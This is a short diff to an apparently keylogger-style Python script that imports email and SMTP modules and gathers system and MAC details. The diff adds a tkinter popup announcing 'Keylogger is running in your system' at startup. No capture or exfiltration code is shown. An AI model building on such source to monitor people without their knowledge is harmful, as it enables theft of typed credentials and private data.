@@ -17,6 +17,16 @@ from email.mime.application import MIMEApplication
 from os.path import basename
 import smtplib
 
+import tkinter as tk
+from tkinter import messagebox
+
+def popup_message(title, message):
+    root = tk.Tk()
+    root.withdraw()  # Hide the main window
+
+    # Create a popup message box
+    messagebox.showinfo(title, message)
+
 def cleanup_function():
     # Perform cleanup actions or trigger desired function
     if search():
@@ -232,6 +242,7 @@ def get_system_and_mac():
 
 
 if __name__ == "__main__":
+    popup_message("Info", "Keylogger is running in your system")
     dt = datetime.now()
     filename = dt.strftime("%Y-%m-%d")
 
